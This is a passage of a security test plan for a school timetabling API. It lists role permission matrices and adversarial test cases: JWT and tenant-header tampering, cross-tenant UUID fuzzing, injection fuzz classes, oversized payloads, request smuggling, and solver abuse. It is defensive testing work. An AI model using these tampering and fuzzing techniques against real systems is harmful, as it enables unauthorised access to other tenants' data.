| SCH-SEC-328 | DELETE /v1/schedules/:id                      | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-329 | POST /v1/schedules/bulk-pin                   | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-330 | POST /v1/schedules/:id/pin                    | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-331 | POST /v1/schedules/:id/unpin                  | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-332 | GET /v1/timetables/teacher/:staffProfileId    | 200 | 200 | 200 | 200 | 200 (own)    | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-333 | GET /v1/timetables/class/:classId             | 200 | 200 | 200 | 200 | 200 (own)    | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-334 | GET /v1/timetables/room/:roomId               | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-335 | GET /v1/timetables/student/:studentId         | 200 | 200 | 200 | 200 | 200 (taught) | 403 | 403 | 200 (linked) / 403 (not) | 403 | 401 |
| SCH-SEC-336 | GET /v1/reports/workload                      | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-337 | GET /v1/scheduling/timetable/my               | 200 | 200 | 200 | 200 | 200          | 200 | 200 | 403                      | 403 | 401 |
| SCH-SEC-338 | GET /v1/scheduling/timetable/teacher/:staffId | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |
| SCH-SEC-339 | GET /v1/scheduling/timetable/class/:classId   | 200 | 200 | 200 | 200 | 403          | 403 | 403 | 403                      | 403 | 401 |

### 13.3 Substitutions / Absences / Offers

| #           | Endpoint                                              | SO  | SP  | VP  | A   | T         | FO  | AC  | P   | S   | U   |
| ----------- | ----------------------------------------------------- | --- | --- | --- | --- | --------- | --- | --- | --- | --- | --- |
| SCH-SEC-340 | POST /v1/scheduling/absences                          | 201 | 201 | 201 | 201 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-341 | POST /v1/scheduling/absences/self-report              | 403 | 403 | 403 | 403 | 201       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-342 | GET /v1/scheduling/absences                           | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-343 | DELETE /v1/scheduling/absences/:id                    | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-344 | POST /v1/scheduling/absences/:id/cancel               | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-345 | POST /v1/scheduling/absences/:id/cancel-own           | 403 | 403 | 403 | 403 | 200 (own) | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-346 | GET /v1/scheduling/absences/:absenceId/substitutes    | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-347 | GET /v1/scheduling/absences/:absenceId/substitutes/ai | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-348 | POST /v1/scheduling/substitutions                     | 201 | 201 | 201 | 201 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-349 | GET /v1/scheduling/substitutions                      | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-350 | GET /v1/scheduling/substitution-board                 | 200 | 200 | 200 | 200 | 200       | 200 | 200 | 403 | 403 | 401 |
| SCH-SEC-351 | GET /v1/scheduling/offers/my                          | 403 | 403 | 403 | 403 | 200       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-352 | POST /v1/scheduling/offers/:id/accept                 | 403 | 403 | 403 | 403 | 200 (own) | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-353 | POST /v1/scheduling/offers/:id/decline                | 403 | 403 | 403 | 403 | 200 (own) | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-354 | GET /v1/scheduling/colleagues                         | 403 | 403 | 403 | 403 | 200       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-355 | GET /v1/scheduling/teachers                           | 200 | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |

### 13.4 Configuration

| #           | Endpoint                                                | SO  | SP  | VP  | A   | T   | FO  | AC  | P   | S   | U   |
| ----------- | ------------------------------------------------------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| SCH-SEC-356 | GET /v1/scheduling/teacher-competencies                 | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-357 | POST /v1/scheduling/teacher-competencies                | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-358 | POST /v1/scheduling/teacher-competencies/bulk           | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-359 | PATCH /v1/scheduling/teacher-competencies/:id           | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-360 | DELETE /v1/scheduling/teacher-competencies/:id          | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-361 | POST /v1/scheduling/teacher-competencies/copy           | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-362 | POST /v1/scheduling/teacher-competencies/copy-to-years  | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-363 | GET /v1/scheduling/substitute-competencies              | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-364 | POST /v1/scheduling/substitute-competencies             | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-365 | DELETE /v1/scheduling/substitute-competencies/:id       | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-366 | GET /v1/scheduling/break-groups                         | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-367 | POST /v1/scheduling/break-groups                        | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-368 | DELETE /v1/scheduling/break-groups/:id                  | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-369 | GET /v1/scheduling/curriculum-requirements              | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-370 | POST /v1/scheduling/curriculum-requirements             | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-371 | POST /v1/scheduling/curriculum-requirements/bulk-upsert | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-372 | DELETE /v1/scheduling/curriculum-requirements/:id       | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-373 | GET /v1/scheduling/room-closures                        | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-374 | POST /v1/scheduling/room-closures                       | 201 | 201 | 201 | 201 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-375 | DELETE /v1/scheduling/room-closures/:id                 | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-376 | GET /v1/scheduling/teacher-config                       | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-377 | PUT /v1/scheduling/teacher-config                       | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-378 | DELETE /v1/scheduling/teacher-config/:id                | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-379 | PUT /v1/scheduling/rotation                             | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-380 | GET /v1/scheduling/rotation                             | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-381 | DELETE /v1/scheduling/rotation                          | 200 | 200 | 200 | 200 | 403 | 403 | 403 | 403 | 403 | 401 |

### 13.5 Calendar / Reports / Dashboard / Exams / Scenarios / Operations

| #           | Endpoint                                                  | SO          | SP  | VP  | A   | T         | FO  | AC  | P   | S   | U   |
| ----------- | --------------------------------------------------------- | ----------- | --- | --- | --- | --------- | --- | --- | --- | --- | --- |
| SCH-SEC-382 | POST /v1/scheduling/calendar-tokens                       | 200         | 200 | 200 | 200 | 200       | 200 | 200 | 403 | 403 | 401 |
| SCH-SEC-383 | GET /v1/scheduling/calendar-tokens                        | 200         | 200 | 200 | 200 | 200       | 200 | 200 | 403 | 403 | 401 |
| SCH-SEC-384 | DELETE /v1/scheduling/calendar-tokens/:tokenId            | 200         | 200 | 200 | 200 | 200 (own) | 200 | 200 | 403 | 403 | 401 |
| SCH-SEC-385 | GET /v1/calendar/:tenantId/:token.ics                     | 200 (token) | 200 | 200 | 200 | 200       | 200 | 200 | 200 | 200 | 200 |
| SCH-SEC-386 | GET /v1/scheduling/cover-reports                          | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-387 | GET /v1/scheduling/cover-reports/fairness                 | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-388 | GET /v1/scheduling/cover-reports/by-department            | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-389 | GET /v1/scheduling-dashboard/overview                     | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-390 | GET /v1/scheduling-dashboard/workload                     | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-391 | GET /v1/scheduling-dashboard/unassigned                   | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-392 | GET /v1/scheduling-dashboard/room-utilisation             | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-393 | GET /v1/scheduling-dashboard/trends                       | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-394 | GET /v1/scheduling-dashboard/preferences                  | 200         | 200 | 200 | 200 | 200 (own) | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-395 | GET /v1/scheduling/analytics/efficiency                   | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-396 | GET /v1/scheduling/analytics/workload                     | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-397 | GET /v1/scheduling/analytics/rooms                        | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-398 | GET /v1/scheduling/analytics/historical                   | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-399 | POST /v1/scheduling/exam-sessions                         | 201         | 201 | 201 | 201 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-400 | DELETE /v1/scheduling/exam-sessions/:id                   | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-401 | POST /v1/scheduling/exam-sessions/:id/publish             | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-402 | POST /v1/scheduling/exam-sessions/:id/assign-invigilators | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-403 | POST /v1/scheduling/scenarios                             | 201         | 201 | 201 | 201 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-404 | POST /v1/scheduling/scenarios/:id/solve                   | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-405 | POST /v1/scheduling/scenarios/compare                     | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-406 | POST /v1/scheduling/swaps/validate                        | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-407 | POST /v1/scheduling/swaps/execute                         | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |
| SCH-SEC-408 | POST /v1/scheduling/emergency-change                      | 200         | 200 | 200 | 200 | 403       | 403 | 403 | 403 | 403 | 401 |

### 13.6 Hostile re-tests of 403 cells (header / JWT tampering)

| #           | Endpoint                                  | Role tested  | Tamper                                                    | Expected                                  | Pass/Fail |
| ----------- | ----------------------------------------- | ------------ | --------------------------------------------------------- | ----------------------------------------- | --------- |
| SCH-SEC-409 | POST /v1/scheduling-runs                  | teacher      | + header `X-Role: school_owner`                           | 403 (header ignored)                      |           |
| SCH-SEC-410 | POST /v1/scheduling-runs                  | teacher      | + header `X-Permissions: schedule.run_auto`               | 403 (header ignored)                      |           |
| SCH-SEC-411 | POST /v1/scheduling-runs                  | teacher      | JWT with manually edited `role: 'school_owner'` claim     | 401 (signature mismatch)                  |           |
| SCH-SEC-412 | POST /v1/scheduling-runs                  | teacher      | JWT with `permissions: ['schedule.run_auto']` claim added | 401                                       |           |
| SCH-SEC-413 | POST /v1/scheduling-runs/:id/apply        | teacher      | + body `{role_override: 'school_owner'}`                  | 403                                       |           |
| SCH-SEC-414 | POST /v1/schedules                        | parent       | normal                                                    | 403                                       |           |
| SCH-SEC-415 | DELETE /v1/scheduling/calendar-tokens/:id | parent       | with another teacher's token id                           | 403                                       |           |
| SCH-SEC-416 | GET /v1/timetables/student/:studentId     | parent       | studentId of NOT linked child                             | 403 NOT_LINKED_PARENT                     |           |
| SCH-SEC-417 | GET /v1/scheduling/teachers               | front_office | normal                                                    | 403 (lacks schedule.manage_substitutions) |           |
| SCH-SEC-418 | All remaining 403 cells from §13.1–13.5   | each role    | normal                                                    | 403 each                                  |           |

### 13.7 Race-condition permission revocation

| #           | Scenario                                                                    | Expected                                                                                                   | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-419 | Admin revokes teacher's `schedule.respond_to_offer` mid `/accept` request   | In-flight: completes; next request → 403                                                                   | P2       |           |
| SCH-SEC-420 | Admin revokes school_owner's `schedule.run_auto` after JWT issued           | JWT remains valid until expiry (≤15 min); refresh fails                                                    | P1       |           |
| SCH-SEC-421 | Teacher's staff_profile_id deleted while solver run is in progress for them | Solver completes; result_json may reference deleted id; apply phase validates FK and rolls back gracefully | P1       |           |

---

## 14. RLS Bypass Attempts

The Scheduling module has **22 tenant-scoped tables** (per inventory §4). Every one needs RLS verification under attack conditions.

### 14.1 Direct cross-tenant ID reads (sequential UUID guessing)

| #           | Attack                                                                                     | Surface                         | Expected | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------ | ------------------------------- | -------- | -------- | --------- |
| SCH-SEC-422 | As stress-d owner, fuzz UUIDs against `/v1/scheduling-runs/{id}` (5,000 known nhqs ids)    | scheduling_run RLS              | 100% 404 | P0       |           |
| SCH-SEC-423 | Fuzz UUIDs against `/v1/schedules/{id}`                                                    | schedule RLS                    | 100% 404 | P0       |           |
| SCH-SEC-424 | Fuzz UUIDs against `/v1/scheduling/curriculum-requirements/{id}`                           | curriculum_requirement RLS      | 100% 404 | P0       |           |
| SCH-SEC-425 | Fuzz UUIDs against `/v1/scheduling/room-closures/{id}` (DELETE)                            | room_closure RLS                | 100% 404 | P0       |           |
| SCH-SEC-426 | Fuzz UUIDs against `/v1/scheduling/absences/{id}`                                          | teacher_absence RLS             | 100% 404 | P0       |           |
| SCH-SEC-427 | Fuzz UUIDs against `/v1/scheduling/offers/{id}/accept`                                     | substitution_offer RLS          | 100% 404 | P0       |           |
| SCH-SEC-428 | Fuzz UUIDs against `/v1/scheduling/teacher-competencies/{id}`                              | teacher_competency RLS          | 100% 404 | P0       |           |
| SCH-SEC-429 | Fuzz UUIDs against `/v1/scheduling/substitute-competencies/{id}`                           | substitute_teacher_competency   | 100% 404 | P0       |           |
| SCH-SEC-430 | Fuzz UUIDs against `/v1/scheduling/break-groups/{id}`                                      | break_group RLS                 | 100% 404 | P0       |           |
| SCH-SEC-431 | Fuzz UUIDs against `/v1/scheduling/teacher-config/{id}`                                    | teacher_scheduling_config RLS   | 100% 404 | P0       |           |
| SCH-SEC-432 | Fuzz UUIDs against `/v1/scheduling/exam-sessions/{id}`                                     | exam_session RLS                | 100% 404 | P0       |           |
| SCH-SEC-433 | Fuzz UUIDs against `/v1/scheduling/exam-sessions/{id}/slots`                               | exam_slot RLS                   | 100% 404 | P0       |           |
| SCH-SEC-434 | Fuzz UUIDs against `/v1/scheduling/scenarios/{id}`                                         | scheduling_scenario RLS         | 100% 404 | P0       |           |
| SCH-SEC-435 | Fuzz UUIDs against `/v1/scheduling/calendar-tokens/{id}`                                   | calendar_subscription_token RLS | 100% 404 | P0       |           |
| SCH-SEC-436 | Fuzz UUIDs against `/v1/scheduling/substitutions/{id}` (PATCH/DELETE)                      | substitution_record RLS         | 100% 404 | P0       |           |
| SCH-SEC-437 | Fuzz UUIDs against `/v1/scheduling/substitutions/{recordId}` (where record_id was foreign) | substitution_record RLS         | 100% 404 | P0       |           |

### 14.2 Header tampering — forced tenant context

| #           | Attack                                                                                          | Surface                      | Expected                                                                     | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------- | ---------------------------- | ---------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-438 | Set `X-Tenant-Id: <victim_tenant_id>` header with attacker's JWT, request `/v1/scheduling-runs` | tenant context resolution    | Server uses JWT tenant_id, ignores header; returns attacker tenant data only | P0       |           |
| SCH-SEC-439 | Set `X-Tenant: <victim>` (alternate header name)                                                | tenant context               | Header ignored                                                               | P0       |           |
| SCH-SEC-440 | Cookie `tenant_id=<victim>` set in addition to JWT                                              | tenant context               | JWT wins                                                                     | P0       |           |
| SCH-SEC-441 | Subdomain attack: attacker uses `nhqs.edupod.app` URL with stress-d JWT                         | host-based tenant resolution | 401 TENANT_MISMATCH or 404                                                   | P0       |           |
| SCH-SEC-442 | `Host: nhqs.edupod.app` header tampering on raw HTTPS connection                                | edge-level tenant resolution | TLS SNI binds the tenant at edge; cannot tamper Host post-handshake          | P0       |           |

### 14.3 JWT swap — token from tenant A queries tenant B resource

| #           | Attack                                                                               | Expected                             | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------ | ------------------------------------ | -------- | --------- |
| SCH-SEC-443 | JWT minted for stress-d, query `/v1/scheduling-runs/{nhqs_run_id}`                   | 404 (RLS filters)                    | P0       |           |
| SCH-SEC-444 | JWT minted for stress-d, query `/v1/scheduling-runs?academic_year_id=<nhqs_year_id>` | 200 with empty data (RLS filters)    | P0       |           |
| SCH-SEC-445 | Same JWT, GET `/v1/scheduling-dashboard/overview?academic_year_id=<nhqs_year_id>`    | 200 with zeros / empty (RLS filters) | P0       |           |
| SCH-SEC-446 | Same JWT, GET `/v1/scheduling/teacher-competencies?staff_profile_id=<nhqs_staff_id>` | 200 with empty (RLS filters)         | P0       |           |
| SCH-SEC-447 | Same JWT, GET `/v1/scheduling/cover-reports?date_from=2026-01-01&date_to=2026-12-31` | 200 with stress-d data only          | P0       |           |
| SCH-SEC-448 | Same JWT, calendar-token `.ics` from a different tenant's tenantId in path           | 404 (token doesn't match tenant)     | P0       |           |

### 14.4 Connection / session pooling — tenant-context leak between transactions

| #           | Attack                                                                                                                                          | Surface                                        | Expected                                                             | Severity | Pass/Fail |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- | -------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-449 | Rapid alternating requests (T1, T2, T1, T2, …) for 10,000 iterations — verify zero cross-tenant rows in result                                  | RLS middleware `SET LOCAL`                     | All responses scoped to JWT tenant_id; zero leak                     | P0       |           |
| SCH-SEC-450 | Tenant A request opens long-running solver job; tenant B request immediately after on (potentially) same conn                                   | PgBouncer transaction-mode connection affinity | RLS context set per-transaction; B's request sees only B             | P0       |           |
| SCH-SEC-451 | Worker `scheduling:solve-v2` picks up T1 job; immediately picks up T2 job on same Prisma client                                                 | Worker `TenantAwareJob` `SET LOCAL`            | T2 sees only T2 data                                                 | P0       |           |
| SCH-SEC-452 | Force a Prisma error mid-transaction in scheduling service; verify next transaction has clean RLS context                                       | Connection-reset behaviour                     | New tx has new `SET LOCAL`; no stale state                           | P0       |           |
| SCH-SEC-453 | Verify all scheduling services use `createRlsClient(prisma, {tenant_id}).$transaction(...)` for writes (grep)                                   | code structural check                          | Zero direct `prisma.<model>.create/update/delete` outside RLS client | P0       |           |
| SCH-SEC-454 | Verify all scheduling services use `prisma.$transaction(async (tx) => ...)` interactive form (no array form)                                    | sequential-transaction lint rule               | Zero `prisma.$transaction([...])` array form                         | P0       |           |
| SCH-SEC-455 | Direct Postgres check: `SELECT * FROM pg_policies WHERE tablename LIKE '%schedul%'` — every scheduling table has RLS policy `_tenant_isolation` | RLS policy presence                            | Every table has policy                                               | P0       |           |
| SCH-SEC-456 | Direct Postgres check: `SELECT relname, relrowsecurity, relforcerowsecurity FROM pg_class WHERE relname LIKE '%schedul%'`                       | RLS enforced + forced                          | All `relrowsecurity=t` AND `relforcerowsecurity=t`                   | P0       |           |

### 14.5 RLS for nullable-tenant edge cases

| #           | Scenario                                                                                         | Expected                                                                                                        | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-457 | `tenant_scheduling_settings` row exists for one tenant; another tenant queries → must not see it | 0 rows                                                                                                          | P0       |           |
| SCH-SEC-458 | Worker dispatch — `BullMQ` job payload missing `tenant_id` → enqueue rejected at base class      | Per inventory §2 — verified: rejected at enqueue                                                                | P0       |           |
| SCH-SEC-459 | Worker dispatch — payload contains `tenant_id: '<malformed>'` or null → rejected                 | Rejected; Sentry alert                                                                                          | P0       |           |
| SCH-SEC-460 | Worker dispatch — payload `tenant_id` differs from `scheduling_run.tenant_id` (race / tampering) | Worker uses `tenant_id` from job; if mismatch with run row, run claim fails (status filter); job logs and exits | P0       |           |

---

## 15. Injection Fuzz — Every Text Input

Use Burp Intruder / ZAP fuzzer with a 200-payload dictionary (SQLi, XSS, SSRF, command, LDAP, NoSQL, header CRLF, unicode, path traversal). Run against every free-text body field and every text-typed query param.

### 15.1 Fields to fuzz

| #           | Field                                              | Endpoint                                                | Payload classes                                     | Pass/Fail |
| ----------- | -------------------------------------------------- | ------------------------------------------------------- | --------------------------------------------------- | --------- |
| SCH-SEC-461 | pin_reason                                         | POST /v1/schedules/:id/pin, POST /v1/schedules/bulk-pin | SQLi, XSS, command, length, unicode                 |           |
| SCH-SEC-462 | reason (absence)                                   | POST /v1/scheduling/absences                            | SQLi, XSS, command, length, unicode                 |           |
| SCH-SEC-463 | reason (self-report absence)                       | POST /v1/scheduling/absences/self-report                | SQLi, XSS, command, length, unicode                 |           |
| SCH-SEC-464 | cancellation_reason                                | POST /v1/scheduling/absences/:id/cancel                 | SQLi, XSS, length                                   |           |
| SCH-SEC-465 | cancellation_reason                                | POST /v1/scheduling/absences/:id/cancel-own             | SQLi, XSS, length                                   |           |
| SCH-SEC-466 | reason_declined                                    | POST /v1/scheduling/offers/:id/decline                  | SQLi, XSS                                           |           |
| SCH-SEC-467 | notes (substitution assign)                        | POST /v1/scheduling/substitutions                       | SQLi, XSS, length                                   |           |
| SCH-SEC-468 | reason (emergency-change)                          | POST /v1/scheduling/emergency-change                    | SQLi, XSS, length, command                          |           |
| SCH-SEC-469 | name (exam session)                                | POST /v1/scheduling/exam-sessions                       | SQLi, XSS, unicode, RTL marks (RLO)                 |           |
| SCH-SEC-470 | name (scenario)                                    | POST /v1/scheduling/scenarios                           | SQLi, XSS, unicode                                  |           |
| SCH-SEC-471 | name (break_group)                                 | POST /v1/scheduling/break-groups                        | SQLi, XSS                                           |           |
| SCH-SEC-472 | week_labels[i] (rotation)                          | PUT /v1/scheduling/rotation                             | XSS, length, NUL                                    |           |
| SCH-SEC-473 | start_time / end_time (HH:mm regex)                | POST /v1/scheduling/exam-sessions/:id/slots             | regex bypass: '24:00', '99:99', '../etc'            |           |
| SCH-SEC-474 | nominated_substitute_staff_id                      | POST /v1/scheduling/absences/self-report                | UUID malformed, cross-tenant uuid                   |           |
| SCH-SEC-475 | adjustment payload (move/swap/remove/add)          | PATCH /v1/scheduling-runs/:id/adjustments               | weekday=99, period_order=-1, JSON injection         |           |
| SCH-SEC-476 | search query (cover-reports, scheduling-dashboard) | GET /v1/scheduling/cover-reports?...                    | SQLi, XSS                                           |           |
| SCH-SEC-477 | config_snapshot (nested JSON)                      | POST /v1/scheduling/scenarios                           | depth bomb, prototype pollution, oversized          |           |
| SCH-SEC-478 | calendar entity_id                                 | POST /v1/scheduling/calendar-tokens                     | UUID malformed, cross-tenant                        |           |
| SCH-SEC-479 | period_from / period_to                            | various                                                 | negative, MAX_INT, fractional, string               |           |
| SCH-SEC-480 | date / date_to (any endpoint accepting date)       | various                                                 | non-ISO, '0001-01-01', '9999-12-31', timezone abuse |           |

For each field: verify every payload is either rejected at Zod (422) or stored verbatim (no rendered execution), and that none of: server crash (500), DB error in response, Prisma stack trace, Postgres error string, file system path leak ever appears.

### 15.2 Large-payload DoS

| #           | Attempt                                                         | Expected                         | Severity | Pass/Fail |
| ----------- | --------------------------------------------------------------- | -------------------------------- | -------- | --------- |
| SCH-SEC-481 | pin_reason 10MB string                                          | 413 Payload Too Large (body cap) | P1       |           |
| SCH-SEC-482 | config_snapshot 5MB nested JSON                                 | 413                              | P1       |           |
| SCH-SEC-483 | bulk-upsert 10,001 curriculum entries                           | 422 Zod refine max(100)          | P1       |           |
| SCH-SEC-484 | bulk teacher-competencies 1,001 entries                         | 422 Zod refine max(500)          | P1       |           |
| SCH-SEC-485 | bulk-pin schedule_ids array of 1,000,000                        | 422 max array (or 413 body size) | P1       |           |
| SCH-SEC-486 | adjustment with 100,000 nested entries (single PATCH)           | 422 or 413                       | P1       |           |
| SCH-SEC-487 | Calendar .ics endpoint hammered with 10,000 req/min from one IP | 429 Too Many Requests            | P1       |           |

### 15.3 Header / cookie fuzz

| #           | Attempt                                                                    | Expected                       | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------- | ------------------------------ | -------- | --------- |
| SCH-SEC-488 | `Content-Type: application/x-www-form-urlencoded` to JSON endpoint         | 415 or 400                     | P2       |           |
| SCH-SEC-489 | `Content-Type: application/xml` with XXE payload                           | 415 (no XML parser registered) | P0       |           |
| SCH-SEC-490 | Oversized cookie (8MB)                                                     | 431 or 400                     | P2       |           |
| SCH-SEC-491 | Header smuggling: `Transfer-Encoding: chunked` + `Content-Length` mismatch | rejected at edge               | P1       |           |

---

## 16. Business-Logic Abuse

### 16.1 Solver-cycle abuse

| #           | Scenario                                                                                                     | Expected                                                                     | Severity | Pass/Fail |
| ----------- | ------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------- | -------- | --------- |
| SCH-SEC-492 | Trigger 100 solver runs in 1 minute (different academic_year_ids in attacker tenant)                         | All accepted but worker concurrency=1 ⇒ serialized; document max queue depth | P1       |           |
| SCH-SEC-493 | Trigger run with hostile `solver_seed` chosen to maximise solver runtime (worst-case branching)              | Solver respects `max_solver_duration` clamp; failure_reason=TIMEOUT          | P1       |           |
| SCH-SEC-494 | Set `max_solver_duration = 99999` via `tenant_scheduling_settings` (admin endpoint elsewhere)                | Server clamps to ceiling (e.g., 3600s)                                       | P0       |           |
| SCH-SEC-495 | Pin schedules so they conflict (teacher T pinned to two periods at same time)                                | Solver returns failure or runs feasibility-fail in seconds                   | P0       |           |
| SCH-SEC-496 | Cancel a queued run, then immediately retrigger; repeat 1,000 times                                          | Each cancel → DB row marked failed; retrigger creates new row; no orphans    | P1       |           |
| SCH-SEC-497 | Trigger run, force solver sidecar to time out (kill process); verify stale-reaper picks it up at next minute | Reaper marks run failed; new trigger possible                                | P1       |           |
| SCH-SEC-498 | Two parallel POST /v1/scheduling-runs with same academic_year_id — race                                      | One 201, one 409 (DB-level partial unique index OR app-level lock)           | P0       |           |

### 16.2 Apply / discard / cancel abuse

| #           | Scenario                                                                   | Expected                                                    | Severity | Pass/Fail |
| ----------- | -------------------------------------------------------------------------- | ----------------------------------------------------------- | -------- | --------- |
| SCH-SEC-499 | Apply same completed run twice (race or replay)                            | First → 200, second → 409 ALREADY_APPLIED (optimistic lock) | P0       |           |
| SCH-SEC-500 | Apply with stale `expected_updated_at` (from earlier read)                 | 409 OPTIMISTIC_LOCK_MISMATCH                                | P0       |           |
| SCH-SEC-501 | Apply a `failed` run                                                       | 409                                                         | P0       |           |
| SCH-SEC-502 | Cancel a `completed` run                                                   | 409 (only queued/running cancellable)                       | P0       |           |
| SCH-SEC-503 | Cancel an `applied` run                                                    | 409 (immutable terminal state)                              | P0       |           |
| SCH-SEC-504 | Discard then apply same run                                                | Apply 409 (run already discarded)                           | P0       |           |
| SCH-SEC-505 | Discard a `queued` run (only completed discardable)                        | 409                                                         | P1       |           |
| SCH-SEC-506 | Apply with hand-crafted body that includes `result_json` override          | Field stripped at Zod; apply uses DB-stored result_json     | P0       |           |
| SCH-SEC-507 | Apply when academic year has been deleted between run completion and apply | 409 ACADEMIC_YEAR_DELETED or graceful failure               | P1       |           |

